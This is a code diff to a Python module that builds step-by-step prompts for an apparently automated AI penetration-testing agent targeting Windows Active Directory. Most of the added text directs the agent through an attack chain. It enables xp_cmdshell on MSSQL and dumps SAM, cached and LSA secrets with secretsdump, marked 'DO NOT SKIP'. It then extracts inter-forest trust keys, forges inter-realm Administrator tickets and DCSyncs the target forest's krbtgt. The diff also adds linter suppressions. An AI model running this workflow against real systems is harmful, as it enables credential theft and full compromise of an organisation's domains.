@@ -227,7 +227,7 @@ def generate_prompt_from_task(
             password = payload.get("password", "")
             domain = payload.get("domain", "")
             base_prompt = (
-                f"**MSSQL IMPERSONATION ENUMERATION**\n\n"
+                f"**MSSQL IMPERSONATION ENUMERATION**\n\n"  # noqa: S608  # nosec B608
                 f"Target: {target}\n"
                 f"Username: {domain}\\{username}\n"
                 f"Password: {password}\n"
@@ -255,8 +255,42 @@ def generate_prompt_from_task(
                 "    windows_auth=True\n"
                 ")\n"
                 "```\n\n"
-                "**STEP 3: With xp_cmdshell, run whoami then attempt secretsdump**\n\n"
-                "Report any credentials or hashes discovered."
+                "**STEP 3: Enable xp_cmdshell**\n"
+                "```\n"
+                f"mssql_enable_xp_cmdshell(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                f"    domain='{domain}'\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 4: Verify OS command execution**\n"
+                "```\n"
+                f"mssql_command(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                "    command='whoami /priv',\n"
+                f"    domain='{domain}'\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 5: DUMP CREDENTIALS (CRITICAL - DO NOT SKIP!)**\n"
+                "Use secretsdump to extract local hashes from this host:\n"
+                "```\n"
+                f"secretsdump(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                f"    domain='{domain}'\n"
+                ")\n"
+                "```\n"
+                "→ This extracts SAM hashes, cached creds, and LSA secrets.\n"
+                "→ Local admin hashes can be reused via PTH against other hosts!\n\n"
+                "Report any credentials or hashes discovered in JSON:\n"
+                "```json\n"
+                '{"credential": {"username": "", "password": "", "domain": ""}, '
+                '"hash": {"username": "", "hash_value": "", "domain": ""}}\n'
+                "```"
             )
             state_context = format_state_context(state, "lateral", current_target=target)
             return base_prompt + state_context
@@ -812,6 +846,31 @@ def _generate_exploit_prompt(
         dc_ip = payload.get("dc_ip", target)
         trusted_domain = payload.get("trusted_domain", "")
         use_hash = payload.get("use_hash", False)
+        target_sid = payload.get("target_sid", "")
+        source_sid = payload.get("source_sid", "")
+
+        # Build SID info section
+        sid_info = ""
+        if source_sid:
+            sid_info += f"Source Domain SID: {source_sid}\n"
+        if target_sid:
+            sid_info += f"Target Domain SID: {target_sid}\n"
+        sid_note = ""
+        if target_sid:
+            sid_note = (
+                f"\n**PRE-RESOLVED SIDs (use these directly, do NOT call get_sid):**\n"
+                f"  source_sid='{source_sid}' (for {domain})\n"
+                f"  target_sid='{target_sid}' (for {trusted_domain})\n"
+            )
+        else:
+            sid_note = (
+                "\n**SID RESOLUTION:** You must get domain SIDs for both domains.\n"
+                f"  source_sid: get_sid(domain='{domain}', username='{username}', "
+                f"password='{password}', dc_ip='{dc_ip}')\n"
+                f"  target_sid: get_sid(domain='{trusted_domain}', username='{username}', "
+                f"password='{password}', dc_ip='{dc_ip}')\n"
+                "  IMPORTANT: get_sid supports pass-the-hash. Pass NTLM hashes as password.\n"
+            )
 
         trust_prompt = (
             f"**TRUST KEY EXTRACTION (Multi-Forest Escalation)**\n\n"
@@ -820,18 +879,26 @@ def _generate_exploit_prompt(
             f"DC IP: {dc_ip}\n"
             f"Credentials: {domain}\\{username}\n"
             f"Auth type: {'NTLM hash' if use_hash else 'password'}\n"
+            f"{sid_info}"
             f"Task ID: {task.task_id}\n\n"
             "**OBJECTIVE:** Extract the inter-realm trust key to pivot to the target forest.\n\n"
             "**STEP 1 - Extract trust key:**\n"
-            f"Use extract_trust_key tool:\n"
             f"  extract_trust_key(domain='{domain}', username='{username}', "
             f"password='{password}', dc_ip='{dc_ip}', trusted_domain='{trusted_domain}'"
             f"{', use_hash=True' if use_hash else ''})\n\n"
-            "**STEP 2 - If trust key obtained, forge inter-realm ticket:**\n"
-            f"Use forge_inter_realm_tgt to create ticket for {trusted_domain}\n\n"
-            "**STEP 3 - Use ticket to access target forest:**\n"
-            "- DCSync the target forest's krbtgt\n"
-            "- Or access resources in the target forest\n\n"
+            "**STEP 2 - Create inter-realm ticket:**\n"
+            f"{sid_note}\n"
+            f"  create_inter_realm_ticket(\n"
+            f"    source_domain='{domain}',\n"
+            f"    source_sid='<source_sid>',\n"
+            f"    trust_key='<trust_key_hash_from_step1>',\n"
+            f"    target_domain='{trusted_domain}',\n"
+            f"    target_sid='<target_sid>',\n"
+            f"    aes_key='<aes256_key_if_available>',\n"
+            f"    username='Administrator'\n"
+            f"  )\n\n"
+            "**STEP 3 - DCSync target forest:**\n"
+            "  secretsdump_kerberos on target forest DC using the inter-realm ticket\n\n"
             "**CRITICAL:** Report the trust key hash and any credentials obtained!\n"
             "This enables full compromise of the target forest."
         )
@@ -886,6 +953,22 @@ def _generate_exploit_prompt(
         dc_ip = payload.get("dc_ip", target)
         trusted_domain = payload.get("trusted_domain", "")
         use_hash = payload.get("use_hash", False)
+        target_sid = payload.get("target_sid", "")
+        source_sid = payload.get("source_sid", "")
+
+        # Build SID section
+        sid_section = ""
+        if target_sid and source_sid:
+            sid_section = (
+                f"\n**PRE-RESOLVED SIDs (use these directly, do NOT call get_sid):**\n"
+                f"  source_sid: {source_sid}\n"
+                f"  target_sid: {target_sid}\n"
+            )
+        elif source_sid:
+            sid_section = (
+                f"\n**Source SID (pre-resolved): {source_sid}**\n"
+                f"You must resolve the target SID: get_sid(domain='{trusted_domain}', ...)\n"
+            )
 
         trust_prompt = (
             f"**CROSS-FOREST TRUST KEY EXTRACTION**\n\n"
@@ -896,27 +979,18 @@ def _generate_exploit_prompt(
             f"Using: {'NTLM hash' if use_hash else 'password'}\n"
             f"Task ID: {task.task_id}\n\n"
             "**OBJECTIVE:**\n"
-            "Extract the trust key (NTLM hash of the trust account) to enable cross-forest attacks.\n\n"
+            "Extract the trust key and forge inter-realm ticket to access the foreign forest.\n\n"
             "**STEP 1: Extract trust key**\n"
-            "```\n"
-            f"extract_trust_key(\n"
-            f"    domain='{domain}',\n"
-            f"    username='{username}',\n"
-            f"    password='{password}',\n"
-            f"    dc_ip='{dc_ip}',\n"
-            f"    trusted_domain='{trusted_domain}'\n"
-            ")\n"
-            "```\n"
-            "This uses secretsdump to extract the trust account hash (e.g., ESSOS$ for essos.local trust).\n\n"
-            "**STEP 2: If trust key obtained, create inter-realm ticket**\n"
-            "Use the trust key to forge a ticket granting access to the foreign forest:\n"
-            "- Get domain SIDs for both source and target domains\n"
-            "- Use create_inter_realm_ticket with the trust key\n"
-            "- Use the forged ticket to access the foreign forest DC\n\n"
-            "**STEP 3: Dump credentials from foreign forest DC**\n"
-            "With the inter-realm ticket, run secretsdump on the foreign DC to get krbtgt hash.\n\n"
-            "**REPORT:**\n"
-            "Include the trust key hash and any credentials obtained in a JSON block."
+            f"  extract_trust_key(domain='{domain}', username='{username}', "
+            f"password='{password}', dc_ip='{dc_ip}', trusted_domain='{trusted_domain}')\n\n"
+            "**STEP 2: Create inter-realm ticket**\n"
+            f"{sid_section}\n"
+            f"  create_inter_realm_ticket(source_domain='{domain}', source_sid=<sid>, "
+            f"trust_key=<hash>, target_domain='{trusted_domain}', target_sid=<sid>, "
+            f"aes_key=<key>, username='Administrator')\n\n"
+            "**STEP 3: DCSync foreign forest DC**\n"
+            "  secretsdump_kerberos on foreign DC using the inter-realm ticket\n\n"
+            "**REPORT:** Include trust key hash and any credentials obtained."
         )
         state_context = format_state_context(state, "exploit", current_target=target)
         return trust_prompt + state_context
@@ -958,7 +1032,7 @@ def _generate_mssql_exploit_prompt(
             )
 
     mssql_prompt = (
-        base_prompt + "**MSSQL EXPLOITATION WORKFLOW (IMPERSONATION FIRST!):**\n\n"
+        base_prompt + "**MSSQL EXPLOITATION WORKFLOW (IMPERSONATION FIRST!):**\n\n"  # noqa: S608  # nosec B608
         "**STEP 1: ENUMERATE IMPERSONATION RIGHTS (DO THIS FIRST!)**\n"
         "```\n"
         "mssql_enum_impersonation(\n"
@@ -1001,7 +1075,20 @@ def _generate_mssql_exploit_prompt(
         ")\n"
         "```\n"
         "→ Check for SeImpersonatePrivilege (potato attack potential)\n\n"
-        "**STEP 5: ENUMERATE LINKED SERVERS**\n"
+        "**STEP 5: DUMP CREDENTIALS (CRITICAL - DO NOT SKIP!)**\n"
+        "After confirming xp_cmdshell works, run secretsdump to extract hashes:\n"
+        "```\n"
+        "secretsdump(\n"
+        f"    target='{target}',\n"
+        "    username=<USER>,\n"
+        "    password=<PASS>,\n"
+        "    domain=<DOMAIN>\n"
+        ")\n"
+        "```\n"
+        "→ Extracts SAM hashes, cached creds, LSA secrets from this host\n"
+        "→ Local admin hashes enable PTH to OTHER hosts (including DCs!)\n"
+        "→ This is the KEY step for cross-forest pivoting!\n\n"
+        "**STEP 6: ENUMERATE LINKED SERVERS**\n"
         "```\n"
         "mssql_enum_linked_servers(\n"
         f"    target='{target}',\n"
@@ -1015,11 +1102,13 @@ def _generate_mssql_exploit_prompt(
         + "\n**CRITICAL NOTES:**\n"
         "- Try EACH credential above - SQL accepts Windows auth\n"
         "- Impersonation check is HIGHEST PRIORITY (fastest path to sysadmin)\n"
+        "- After xp_cmdshell, ALWAYS run secretsdump - local admin hash reuse is common\n"
         "- If xp_cmdshell gives NETWORK SERVICE, you may need potato attack for SYSTEM\n"
         "- Linked servers enable cross-domain pivoting\n\n"
-        "Report credentials obtained in JSON format:\n"
+        "Report credentials AND hashes obtained in JSON format:\n"
         "```json\n"
-        '{"credential": {"username": "", "password": "", "domain": "", "is_admin": false}}\n'
+        '{"credential": {"username": "", "password": "", "domain": "", "is_admin": false}, '
+        '"hash": {"username": "", "hash_value": "", "hash_type": "NTLM", "domain": ""}}\n'
         "```"
     )
     state_context = format_state_context(state, "exploit", current_target=target)
